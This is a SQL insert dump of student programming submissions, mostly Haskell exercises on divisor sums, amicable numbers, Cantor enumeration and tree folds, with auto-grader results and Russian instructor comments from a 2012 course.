(2163, 68, 'Deutsche', '2012-10-17 15:58:24', 1, '﻿// Задача 16.1 Чистяков П.П., гр. 543\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _16._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static long[] zeroDigits(long[] a, int n)\r\n\r\n        {\r\n\r\n            long[] b = a.Select(x => x - x % (int)(Math.Pow(10, n))).ToArray();\r\n  --- ОК, но лучше, конечно, один раз посчитать Math.Pow(10, n), вне лямбда-выражения,\r\n  --- как вы с С++ делали\r\n            return b;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            long[] ar = new long[18] { 45345, 32522, 5427234, 12510, 26231, 8745, 5632, 236, 40, 4, 23265, 2364, 45650, 432, 3632268, 232550, 362, 3664};\r\n\r\n            int n = 0;\r\n\r\n            Console.WriteLine("Source array:");\r\n\r\n            for (int i = 0; i <= 17; i++)\r\n\r\n                Console.Write(ar[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Input n: ");\r\n\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n\r\n\r\n\r\n            long[] b = zeroDigits(ar, n);\r\n\r\n            Console.WriteLine("Result array:");\r\n\r\n            for (int i = 0; i < b.Length; i++)\r\n\r\n                Console.Write(b[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2164, 61, '9539826', '2012-10-17 15:59:29', 1, 'func x = [y|y<-[1..x],z<-[1..x],y*z==x]\r\n  --- OK, но гораздо проще и быстрее\r\n  ---  func x = [y|y<-[1..x], mod x y == 0]\r\nsumDiv x = foldl (+) (-x) (func x)\r\nperfects n = [x|x<-[1..n],x==sumDiv x]', '<br/>Тесты успешно пройдены!'),
(2165, 67, 'Deutsche', '2012-10-17 16:02:18', 1, '// Задача 16.2 Чистяков П.П. гр. 543\r\n#include <algorithm> \r\n#include <iostream>\r\n#include <math.h>\r\n\r\nusing namespace std;\r\n\r\nstatic long* nonZeroLastDigits(long* a, int size, int n)\r\n{\r\n	long* b = new long[size];\r\n	int p = pow(10, (float)n);\r\n	transform(a, a+25, b, [p] (int i) { return (i - i % p); });\r\n	return b;\r\n}\r\n\r\nint main()\r\n{\r\n	long ar[18] = {45345, 32522, 5427234, 12510, 26231, 8745, 5632, 236, 40, 4, 23265, 2364, 45650, 432, 3632268, 232550, 362, 3664};\r\n    cout << "Source array:\r\n";\r\n    for (int i = 0; i < 18; i++)\r\n        cout << ar[i] << "   ";\r\n    cout << "\r\n\r\n";\r\n	int n = 0;\r\n	cout << "Input n: ";\r\n	cin >> n;\r\n	cout << "\r\n";\r\n    long* res = nonZeroLastDigits(ar, 25, n);\r\n\r\n    cout << "Result array:\r\n" ;\r\n    for (int i = 0; i<18; i++)\r\n		cout << res[i] << "   ";\r\n    cout << "\r\n";\r\n	delete [] res;\r\n	char a;\r\n	cin >> a;\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2166, 66, '787463', '2012-10-17 16:09:16', 1, 'expand n 1 = [[n]]\r\nexpand n k = [x : ys | x <- [1..(n - k + 1)], let yss = expand (n - x) (k - 1), ys <- yss]\r\nexpandList k = [(xs, length xs) | n <- [k..], let xs = expand n k]\r\n\r\ngetIndex n k = getIndex'' n k 0 1\r\ngetIndex'' n k ind acc\r\n  | n - acc <= 0 = (ind, acc - n)\r\n  | otherwise = getIndex'' n k (ind + 1) (acc + snd (expandList k !! (ind + 1)))\r\n\r\ngenCantor n k =\r\n  let\r\n    (ind1, ind2) = getIndex n k\r\n  in ((fst (expandList k !! ind1)) !! ind2) : (genCantor (n + 1) k)\r\n\r\ngeneralizedCantor k = genCantor 1 k', '<br/>Тесты успешно пройдены!'),
(2167, 62, '5656962', '2012-10-17 16:10:13', 1, 'sumDiv n = sum[k | k <- [1..n `div` 2], n `mod` k == 0]\r\n\r\n\r\n\r\namicables n = [(a, b) | a <- [1..n], let b = sumDiv a, a == sumDiv b, a < b]\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2168, 65, '528420', '2012-10-17 16:15:17', 1, 'cantor = [(y,z) | x<-[2..], y<-[1..(x-1)], z<-[1..(x-1)], y+z == x]\r\n   --- OK, все правильно, но можно (и лучше)\r\n   ---  cantor = [(y,z) | x<-[2..], y<-[1..(x-1)], let z = x - y]\r\n   --- Те нам не надо z перебирать, мы можем его просто посчитать\r\n', '<br/>Тесты успешно пройдены!'),
(2169, 63, '9539826', '2012-10-17 16:56:15', 1, 'ff = 5:ff\r\ns x y = x*10 + y\r\nfives = [x|y<-[1..],let x=foldl (s)(5)(take (y-1) ff)]', '<br/>Тесты успешно пройдены!'),
(2170, 64, '550896', '2012-10-17 17:22:30', 2, 'data Tree a = Leaf a | Branch (Tree a) (Tree a) \r\n   --- Но это не совсем то дерево, которое было в наших примерах.\r\n   --- Напишите пожалуйста все то же для того дерева, которое было у нас на занятиях -\r\n   --- это ведь вам нетрудно, я думаю..\r\n   --- Можно не обядательно до начала пары - в четверг вечером тоже будет нормально   \r\nflatten :: Tree a -> [a]\r\nflatten (Leaf x) = [x]\r\nflatten (Branch left right) = flatten left ++ flatten right\r\n\r\nfoldTree :: (Int -> Int -> Int) -> Int -> Tree Int -> Int\r\nfoldTree op x t = foldTree0 op x (flatten t)\r\n\r\nfoldTree0 :: (Int -> Int -> Int) -> Int -> [Int] -> Int\r\nfoldTree0 op x a | null a = x\r\nfoldTree0 op x a = foldTree0 op (op x (head a)) (tail a)', '<br/>Тесты успешно пройдены!'),
(2171, 63, '355679', '2012-10-17 17:39:55', 0, 'fives = map\r\n  (x ->\r\n    if (x == 0) then\r\n      5\r\n    else\r\n      5 * 10 ^ x + ( fives !! (x - 1) )\r\n  )\r\n  [0..]', '<br/>Тесты успешно пройдены!'),
(2172, 61, '532002', '2012-10-17 17:40:19', 0, '', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(2173, 63, '355679', '2012-10-17 17:40:35', 0, 'fives = fives1 1 0\n\n\n\nfives1 degree previous = let {\n\n    this = 5 * degree + previous;\n\n  } in (\n\n    this:(fives1 (10 * degree) this)\n\n  )\n', '<br/>Тесты успешно пройдены!'),
(2174, 61, '532002', '2012-10-17 17:40:58', 1, 'sumDiv n = foldr (+) 0 [x|x<-[1..(div n 2)], mod n x == 0]\r\n\r\nperfects n =[x|x<-[1..n],sumDiv x == x]\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2175, 62, '532002', '2012-10-17 17:42:04', 1, 'sumDiv n = foldr (+) 0 [x|x<-[1..(div n 2)], mod n x == 0]\r\n\r\n\r\n\r\namicables n = let sums = [sumDiv x|x<-[1..n]]\r\n\r\n              in [(x,y)|y<-[1..n],x<-[t|t<-[1..y-1], (sums !!(t-1)) == y], (sums !!(y-1)) == x]\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2176, 63, '532002', '2012-10-17 17:42:21', 0, 'fives = foldr (x xs ->((foldr (	 ts->ts*10+5) 5 [1..x]):xs)) [] [1..]\r\n\n\n', 'Выражение имеет неправильное значение: take 4 fives'),
(2177, 64, '419046', '2012-10-17 17:43:08', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\ntolist Empty = []\r\n\r\ntolist (Node n l r) = tolist l ++ [n] ++ tolist r\r\n\r\nfoldTree (x) m (Node n l r) = foldl (x) m (tolist (Node n l r))\r\n\r\n\r\n\r\n--foldTree (*) 1 (Node 1 (Node 2 (Node 3 Empty Empty) Empty) (Node 4 Empty Empty))\r\n\r\n\r\n\r\n--foldTree (+) 0 (Node 1 (Node 2 (Node 3 Empty Empty) Empty) (Node 4 Empty Empty))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2178, 63, '355679', '2012-10-17 17:43:35', 1, '-- вот, так лучше всего --\r\n   --- не уверен, что лучше всего, мне кажется лучше использовать прием typing the knot, который мызавтра пройдем\r\n   --- Но ок, замечательно\r\nfives = map\r\n\r\n  (x ->\r\n\r\n    if (x == 0) then\r\n\r\n      5\r\n\r\n    else\r\n\r\n      (fives !! (x - 1)) * 10 + 5\r\n\r\n  )\r\n\r\n  [0..]\r\n', '<br/>Тесты успешно пройдены!'),
(2179, 63, '532002', '2012-10-17 17:44:14', 1, 'fives = foldr (x xs ->((foldr (	 ts->ts*10+5) 5 [1..x-1]):xs)) [] [1..]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2180, 61, '355679', '2012-10-17 17:50:54', 1, 'sumDiv n = sum [x | x <- [1..(n `div` 2)], n `mod` x == 0]\r\n\r\n\r\n\r\nisPerfect n = n == (sumDiv n)\r\n\r\n\r\n\r\nperfects n = [x | x <- [2..n], isPerfect x]\r\n', '<br/>Тесты успешно пройдены!'),
(2181, 64, '3742311', '2012-10-17 18:11:49', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nfoldTree _ s Empty = s\r\nfoldTree f s (Node i t1 t2) = f i (foldTree f (foldTree f s t1) t2)\r\n\r\ntoList t = foldTree (x s -> x:s) [] t\r\n   --- toList то зачем?? Списали чтоли откуда-нибудь? :((', '<br/>Тесты успешно пройдены!'),
(2182, 64, '532002', '2012-10-17 18:17:04', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree (f) h Empty  = h\r\n\r\nfoldTree (f) h (Node n l r) = foldTree f (foldTree f (n `f` h) r) l\r\n\r\n\r\n\r\nfoldTree1 = foldTree (+) 0 (Node 4 (Node 7 Empty Empty) (Node 9 Empty Empty))\r\n\r\nfoldTree2 = foldTree (:) [] (Node 4 (Node 7 Empty (Node 2 Empty Empty)) (Node 9 Empty Empty))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2183, 61, '4169333', '2012-10-17 18:33:32', 1, 'sumDiv n= sum([x| x<-[1..div n 2], mod n x == 0])\r\nperfects n = [x| x<- [1..n],x == sumDiv x]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2184, 62, '4169333', '2012-10-17 18:34:16', 1, 'sumDiv n= sum ([x| x<- [1..div n 2], mod n x == 0])\r\namicables n= [(a,b)| a<-[1..n],b<-[1..n], a==sumDiv b && b==sumDiv a && a<b]\r\n   --- ОК, но, на самом деле можно легко написать гораздо эффективнее, мы это завтра обсудим\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2185, 63, '4169333', '2012-10-17 18:34:43', 1, 'fives1 n=n: fives1 (5+10*n)\r\nfives=fives1 5\r\n', '<br/>Тесты успешно пройдены!'),
(2186, 62, '355679', '2012-10-17 18:38:27', 1, 'sumDiv n = sum [x | x <- [1..(n `div` 2)], n `mod` x == 0]\r\n\r\n\r\n\r\n-- Первый вариант. Тут мы делаем много лишних вычислений, --\r\n\r\n-- так как много раз считаем сумму делителей одного и того же числа --\r\n\r\n\r\n\r\namicables1 n = [\r\n\r\n    (x, y) |\r\n\r\n    x <- [2..n],\r\n\r\n    let sumDivX = sumDiv x,\r\n\r\n    y <- [(x + 1)..n],\r\n\r\n    sumDivX == y && sumDiv y == x\r\n\r\n  ]\r\n     --- ОК, но этот вариант у вас написан (нечаяно видимо?) совсем уж неэффективно, все то же лучше конечно\r\n     --- написатьт так\r\n--- amicables1 n = [\r\n---    (x, y) |\r\n---    x <- [2..n],\r\n---    let sumDivX = sumDiv x,\r\n---    let y = sumDivX,    --- Зачем нам генератор, мы _знаем_ y !\r\n---    y > x, y <= n,      --- надо просто проверить, что он в нужном диапазоне  \r\n---    sumDivX == y && sumDiv y == x\r\n---  ]\r\n\r\n\r\n\r\n\r\n\r\n-- Во втором варианте считаем все суммы для всех чисел от 2 до n заранее. --\r\n\r\n-- Зато тут требуется больше памяти, чтобы хранить громоздкую таблицу n * n --\r\n\r\n\r\n\r\n-- декартово произведение--\r\n\r\ndekart s1 s2 = foldr\r\n\r\n  (el1 res -> foldr\r\n\r\n    ( el2 res -> (el1, el2) : res )\r\n\r\n    res\r\n\r\n    s2\r\n\r\n  )\r\n\r\n  []\r\n\r\n  s1\r\n\r\n\r\n\r\namicables2 n = let {\r\n\r\n    sumDivN = map ( x -> (x, sumDiv x) ) [2..n];\r\n\r\n    dekartSumDivN = dekart sumDivN sumDivN;\r\n\r\n  } in (\r\n\r\n    [ (x, y) |\r\n\r\n      ((x, sumX), (y, sumY)) <- dekartSumDivN,\r\n\r\n      x < y && sumX == y && sumY == x\r\n\r\n    ]\r\n\r\n  )\r\n\r\n\r\n\r\n-- Третий вариант. Отбросив метод чайника, не храним таблицу, --\r\n\r\n-- а прямо во внутреннем цикле функции dekart решаем, нужна нам эта пара или нет. --\r\n\r\n-- Кроме того, каждый раз выбираем подспискок для игреков, --\r\n\r\n-- чтобы не ходить по парам x > y --\r\n\r\n\r\n\r\namicables3 n = let {\r\n\r\n    sumDivN = map ( x -> (x, sumDiv x) ) [2..n];\r\n\r\n  } in (\r\n\r\n    foldr\r\n\r\n      ((x, sumX) res -> foldr\r\n\r\n        ((y, sumY) res ->\r\n\r\n          if (sumX == y && sumY == x) then (\r\n\r\n            (x,y):res\r\n\r\n          ) else (\r\n\r\n            res\r\n\r\n          )\r\n\r\n        )\r\n\r\n        res\r\n\r\n        (drop (x - 1) sumDivN)\r\n\r\n      )\r\n\r\n      []\r\n\r\n      sumDivN\r\n\r\n  )\r\n\r\n\r\n-- Примечание --\r\n\r\n-- Я включил второй вариант затем, чтобы было понятнее, что происходит в третьем. --\r\n\r\n-- Потому что, по-моему, там мясо --\r\n\r\n       --- Но ОК, amicable3 - прекрасная реализвцмя..  \r\n\r\n\r\namicables = amicables3\r\n', '<br/>Тесты успешно пройдены!'),
(2187, 65, '550896', '2012-10-17 18:40:41', 0, 'func :: (Int, Int) -> (Int, Int)\r\nfunc (n0, n1) | n0 == n1 = (n0, n1 + 1)\r\nfunc (n0, n1) = (n0 + 1, n1)\r\n\r\ncantor = iterate func (1, 1)', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2188, 65, '550896', '2012-10-17 18:49:58', 1, 'func :: (Int, Int) -> (Int, Int)\r\nfunc (n0, n1) | n0 == 1 = (n1 + 1, 1)\r\nfunc (n0, n1) = (n0 - 1, n1 + 1)\r\n\r\ncantor = iterate func (1, 1)', '<br/>Тесты успешно пройдены!'),
(2189, 65, '63706456', '2012-10-17 18:55:04', 1, 'cantor = [x|n <- [1..], x <- (zip [1..n] [n, n-1..1])]', '<br/>Тесты успешно пройдены!'),
(2190, 64, '4169333', '2012-10-17 19:19:27', 1, 'data Tree= Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x left right)= f (foldTree f e left) (f x (foldTree f e right))\r\n-- Программу можно использовать для нахождения суммы/произведения элементов дерева', '<br/>Тесты успешно пройдены!'),
(2191, 60, '419046', '2012-10-17 19:50:08', 1, '#include <algorithm>  \r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int MAXN = 1000;\r\n\r\nvoid nonZeroLastDigits (int *a,int c)\r\n\r\n{\r\n\r\n\r\n\r\n   int b[MAXN];\r\n\r\n   transform(a, a+c, b, [] (int i) { return i%10; }); \r\n\r\n   int* end = remove_if(b, b+c, [] (int i) { return i == 0; });\r\n\r\n   int* begin = b;\r\n\r\n   for (int* j=begin; j<end; j++)\r\n\r\n   cout << *j<<endl;\r\n\r\n\r\n\r\n}\r\n\r\nint main()\r\n\r\n{\r\n\r\n      int a[] = { 145, 332, 300, 404, 5555 };\r\n\r\n      nonZeroLastDigits (a,5);\r\n\r\n      return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2192, 66, '550896', '2012-10-17 19:56:29', 2, 'generalizedCantor :: Int -> [[Int]]\r\ngeneralizedCantor n = iterate (func2 n) (replicate n 1)\r\n\r\nisIdent :: [Int] -> Bool\r\nisIdent a | null a || null (tail a) = True\r\nisIdent a | (head a) == head (tail a) = isIdent (tail a)\r\nisIdent a = False\r\n\r\nfunc2 :: Int -> ([Int] -> [Int])\r\nfunc2 n a | isIdent a = [(head a) + 1] ++ replicate (n-1) 1\r\nfunc2 n a = [head a] ++ func2 (n - 1) (tail a)\r\n   --- Мне кажется, у вас в последовательности нет например [2,1,2] (во всяком случае, \r\n   --- среди первого 1000000 элементов, я проверил)', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2193, 64, '472848', '2012-10-17 20:10:27', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nfoldTree op n (Node i t0 t1) = foldTree op (op (foldTree op n t0) i) t1 \r\nfoldTree op n Empty = n\r\n\r\nmyTree3 = Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 2 (Node 3 (Node 4 Empty Empty) Empty) Empty)\r\n\r\n--foldTree (+) 0 myTree3 = 15\r\n--foldTree (*) 1 myTree3 = 144', '<br/>Тесты успешно пройдены!'),
(2194, 61, '17107004', '2012-10-17 20:10:40', 1, '\r\nsumDiv n = foldl1 (+) (filter (x -> (mod n x) == 0) [1 .. (div n 2)])\r\n\r\n\r\n\r\nperfects n = filter ( x -> x == (sumDiv x)) [2..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2195, 64, '533223', '2012-10-17 20:21:32', 1, 'data Tree = Empty| Node Int Tree Tree\r\n\r\nfoldTree f res Empty = res\r\nfoldTree f res (Node a l r) = ((foldTree f res l) `f` a) `f` (foldTree f res r)\r\n\r\nfoldTree (+) 0 (Node 1 (Node 3 Empty Empty) (Node 2 Empty (Node 7 Empty Empty)))', '<br/>Тесты успешно пройдены!'),
(2196, 62, '17107004', '2012-10-17 20:34:31', 1, '\r\nsumDiv n = foldl (+) 0 (filter (x -> (mod n x) == 0) [1 .. (div n 2)])\r\n\r\n\r\n\r\namicables n = let sumdivs = map sumDiv [0..n] in\r\n\r\n	foldr ( x y -> let a = sumdivs !! x\r\n\r\n			    b = if a <= n then (sumdivs !! a) else 0 in \r\n\r\n		if b == x && x < a\r\n\r\n		then (x, a) : y\r\n\r\n		else y ) [] [2..n]\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2197, 63, '17107004', '2012-10-17 20:39:55', 0, '', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(2198, 63, '17107004', '2012-10-17 20:40:11', 1, '\r\nfivs b = b : fivs (b * 10 + 5)\r\n\r\nfives = fivs 5\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2199, 61, '214982', '2012-10-17 20:40:37', 1, 'sumD n 1 = 1\r\nsumD n k = if (mod n k == 0) then (k + sumD n (k-1)) else (sumD n (k-1)) \r\n\r\nsumDiv 0 = 0\r\nsumDiv 1 = 0\r\nsumDiv n = sumD n (div n 2)\r\n\r\nperfects 1 = []\r\nperfects n = if (n == sumDiv n) then (perfects (n-1))++[n] else (perfects (n-1))', '<br/>Тесты успешно пройдены!'),
(2200, 63, 'Маргарита Нурмухаметова', '2012-10-17 20:44:24', 1, 'fives = map (i -> take i (repeat 5)) [1..]\r\n   --- не совсем то, но ОК, зачтено, и мы это разберем \r\n\r\n\r\n', 'Выражение имеет неправильное значение: take 4 fives'),
(2201, 64, '17107004', '2012-10-17 20:56:03', 0, '', '<br/>Тесты успешно пройдены!'),
(2202, 64, '17107004', '2012-10-17 20:56:29', 1, '\r\ndata Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nfoldTree fn base Empty = base\r\n\r\nfoldTree fn base (Node a tl tr) = fn a (foldTree fn base tl) (foldTree fn base tr)\r\n\r\n\r\n\r\nheight = foldTree ( x l r -> 1 + (max l r)) 0\r\n\r\nsumElem = foldTree ( x l r -> x + l + r) 0\r\n\r\n\r\n\r\n{- solves subtask a), from here comes such strange name -}\r\n\r\nfoldTreeA fn = foldTree (x l r -> fn (fn l x) r)\r\n\r\n\r\n\r\nmulElem = foldTreeA (*) 1 \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2203, 61, '985727', '2012-10-17 21:02:34', 1, 'f x n = if (mod x n == 0) then n else 0\r\ng x 0 = 0\r\ng x 1 = 1\r\ng x n = f x n + g x (n-1)\r\nsumDiv x = g x (div x 2)\r\nperfects n = [ i | i <- [1..n], i == sumDiv i ]', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2204, 62, '214982', '2012-10-17 21:16:00', 0, '{-мне не нравится скорость работы, если придумаю получше - пришлю-}\r\nsumD n 1 = 1\r\nsumD n k = if (mod n k == 0) then (k + sumD n (k-1)) else (sumD n (k-1)) \r\n\r\nsumDiv 0 = 0\r\nsumDiv 1 = 0\r\nsumDiv n = sumD n (div n 2)\r\n\r\nisFriends n k = if (not (sumDiv n == k)) then False else sumDiv k == n\r\n\r\ngetAllFriends n 1 = []\r\ngetAllFriends n k = if (isFriends n k) then (n, k):result else result where result = getAllFriends n (k - 1)\r\n\r\namicables 1 = []\r\namicables n = (getAllFriends n (n - 1))++amicables (n - 1) \r\n', 'Выражение имеет неправильное значение: amicables 300'),
(2205, 61, '5477377', '2012-10-17 21:29:43', 1, 'sumDiv n = foldr (+) 0 (filter (x -> (mod n x == 0)) [1..n-1])\r\n\r\nperfects n = filter (x -> (sumDiv x == x)) [1..n]', '<br/>Тесты успешно пройдены!'),
(2206, 62, '985727', '2012-10-17 21:31:31', 1, 'f x n = if (mod x n == 0) then (n ) else 0\r\ng x 0 = 0\r\ng x 1 = 1\r\ng x n = f x n + g x (n-1)\r\nsumDiv x = g x (div x 2)\r\namicables n = [ (j,i) | i <- [1..n], j <- [1..(i-1)], i == sumDiv j && j == sumDiv i ]\r\n   --- ОК, но тут легко можно написать гораздо эффективнее, мы это сегодня обсудим', '<br/>Тесты успешно пройдены!'),
(2207, 62, '5477377', '2012-10-17 21:37:04', 1, 'sumDiv n = foldr (+) 0 (filter (x -> (mod n x == 0)) [1..n-1])\r\n\r\nisFriend (x,y) =\r\n		if sumDiv x == y then\r\n			sumDiv y == x\r\n		else\r\n			False\r\n   --- иди просто  ... = sumDiv x == y && sumDiv y == x\r\n\r\namicables n = filter (isFriend) [(x,y) | y <- [1..n], x <- [1..(y - 1)]]\r\n   --- ОК, но тут можно немного исправить, и будет гораздо эффективнее, мы это сегодня обсудим', '<br/>Тесты успешно пройдены!'),
(2208, 62, '214982', '2012-10-17 21:41:42', 1, '{-мне не нравится скорость работы, постараюсь придумать получше-}\r\n   --- Ну да, у вас в одном месте случайно получилось _очень_ неэффективно. \r\n   --- Мы это сегодня разберем, но если придумаете в чем наэффективность, присылайте\r\n   --- Особой хитрости нет, вы просто в какой-то момент делаете много лишней работы..\r\nsumD n 1 = 1\r\nsumD n k = if (mod n k == 0) then (k + result) else (result) where result = sumD n (k-1)\r\n\r\nsumDiv 0 = 0\r\nsumDiv 1 = 0\r\nsumDiv n = sumD n (div n 2)\r\n\r\nisFriends n k = if (not (sumDiv n == k)) then False else sumDiv k == n\r\n\r\ngetAllFriends 1 k = []\r\ngetAllFriends n k = if (isFriends n k) then (n, k):result else result where result = getAllFriends (n-1) k\r\n\r\namicables 1 = []\r\namicables n = (getAllFriends (n - 1) n)++amicables (n - 1) \r\n', '<br/>Тесты успешно пройдены!'),
(2209, 63, '985727', '2012-10-17 22:12:31', 1, 'd 1 = 5\r\nd n = d (n-1) * 10 + 5\r\nfives  = map(d) [1..]', '<br/>Тесты успешно пройдены!'),
(2210, 64, '214982', '2012-10-17 22:15:42', 0, '{-Пока что тут только пункт а)-}\r\ndata Tree x\r\n    = Leaf x\r\n    | Branch (Tree x) x (Tree x)\r\nfoldTree funct start  (Leaf x) = funct start x\r\nfoldTree funct start(Branch left x right)= foldTree funct (foldTree funct (funct x start) left) right\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2211, 65, '17107004', '2012-10-17 22:21:38', 1, '\r\n\r\n\r\nctr a 1 = (a, 1) : ctr 1 (a + 1)\r\n\r\nctr a b = (a, b) : ctr (a + 1) (b - 1)\r\n\r\n\r\n\r\ncantor = ctr 1 1\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2212, 66, '17107004', '2012-10-17 22:22:14', 1, '\r\ngeneralizedCantor n = ctr (map (const 1) [1..n])\r\n\r\n\r\n\r\nones n = map (const 1) [1..n]\r\n\r\n\r\n\r\nstep o (1:y:xs) = step  (o + 1) (y:xs)\r\n\r\n\r\n\r\nstep o ([x])    = (x + 1) : ones(o)\r\n\r\nstep o (x:y:xs) = (x - 1) : ones(o) ++ (y + 1 : xs) \r\n\r\n\r\n\r\nctr lst = lst : ctr (step 0 lst)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2213, 64, '214982', '2012-10-17 22:23:29', 1, 'data BinaryTree a =\r\n	Leaf a\r\n	|Branch (BinaryTree a) a (BinaryTree a)\r\n\r\nfoldTree f x (Leaf a) = f x a\r\nfoldTree f x (Branch l a r) = foldTree f (f (foldTree f x r) a) l\r\n   --- Но это не совсем то дерево, о котором мы говорили на занятии\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2214, 64, '355679', '2012-10-17 22:27:52', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n\r\n\r\n-- отличие от fold(r|l) для списков в том, что ф-я f должна принимать три параметра: --\r\n\r\n-- значение в вершине и 2 результата для детей, что вполне логично --\r\n\r\n\r\n\r\nfoldTree _ res Empty = res\r\n\r\nfoldTree f res (Node a t1 t2) = let {\r\n\r\n    res1 = foldTree f res t1;\r\n\r\n    res2 = foldTree f res t2;\r\n\r\n  } in (\r\n\r\n    f a res1 res2\r\n\r\n  )\r\n\r\n\r\n\r\n-- examples --\r\n\r\ntree = (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))\r\n\r\n\r\n\r\nasList = foldTree (x l r -> x : l ++ r) []\r\n\r\nsumTree = foldTree (x l r -> x + l + r) 0\r\n\r\nproductTree = foldTree (x l r -> x * l * r) 1\r\n\r\n\r\n\r\n-- либо можно добавить в конце "минус один", смотря что мы хотим посчитать: --\r\n\r\n-- количество узлов или ребер в самой длинной ветке --\r\n\r\nheight = foldTree (x l r -> max l r + 1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(2215, 61, '83813', '2012-10-17 23:15:49', 1, 'unfoldDivisors n list = list ++ [n `div` d | d <- list, d * d /= n, d /= 1]\r\n\r\nsumDiv n = sum $ unfoldDivisors n [d | d <- [1..(+1) $ ceiling $ sqrt $ fromIntegral n], n `mod` d == 0, d * d <= n, d /= n]\r\n\r\nperfects bound = [n | n <- [1..bound], sumDiv n == n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2216, 62, '83813', '2012-10-17 23:18:46', 1, 'unfoldDivisors n list = list ++ [n `div` d | d <- list, d * d /= n, d /= 1]\r\n\r\nsumDiv n = sum $ unfoldDivisors n [d | d <- [1..(+1) $ ceiling $ sqrt $ fromIntegral n], n `mod` d == 0, d * d <= n, d /= n]\r\n\r\namicables n = [(a,b) | a<-[1..n], b<-[a + 1..n], sumDiv a == b, sumDiv b == a]\r\n   --- Так, на самом деле у вас случайно получилось очень неэффекивно, и если немного исправить, \r\n   --- то будет гораздо эффективнее. ОК, мы это сегодня разберем..\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2217, 61, '51559263', '2012-10-17 23:18:50', 2, 'sumDiv n = sum [ m | m <- [1..div n 2], rem n m == 0 ]\r\n\r\n\r\n\r\nperfects n = [ m | m <- [1..n], sumDiv m == m ]\r\n', '<br/>Тесты успешно пройдены!'),
(2218, 56, '214982', '2012-10-17 23:21:32', 1, 'getArray n = [[x] | x <-[1..n]]\r\ngetArr n = [x | x <- [1..n]]\r\n\r\nmapa [x] y = map (x:) y\r\nmapa (x:xs) y = (map (x:) y) ++ mapa xs y \r\n\r\nwithList 0 n x = x\r\nwithList k n x = mapa (getArr n) (withList (k - 1) n x)\r\n\r\nallLists n k = withList (k - 1) n (getArray n)', '<br/>Тесты успешно пройдены!'),
(2219, 63, '83813', '2012-10-17 23:24:17', 1, 'genfive n = read [''5'' | _ <- [1..n]] :: Integer\r\n\r\nfives = [genfive n | n <- [1..]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2220, 65, '214982', '2012-10-17 23:35:35', 1, 'f (x, y) = if (x > y) then (y, x) else (x + 1, y) \r\n\r\ncantor = (1,1):(map f cantor)\r\n', '<br/>Тесты успешно пройдены!'),
(2221, 61, '374969', '2012-10-17 23:47:18', 0, 'divisors n = [x | x <- [1..(div n 2)], mod n x == 0]\r\nsumDiv = sum . divisors\r\nperfects n = [x | x <- [1..n], n == sumDiv n]', 'Выражение имеет неправильное значение: perfects 100'),
(2222, 61, '374969', '2012-10-17 23:48:51', 1, 'divisors n = [x | x <- [1..(div n 2)], mod n x == 0]\r\nsumDiv = sum . divisors\r\nperfects n = [x | x <- [1..n], x == sumDiv x]', '<br/>Тесты успешно пройдены!'),
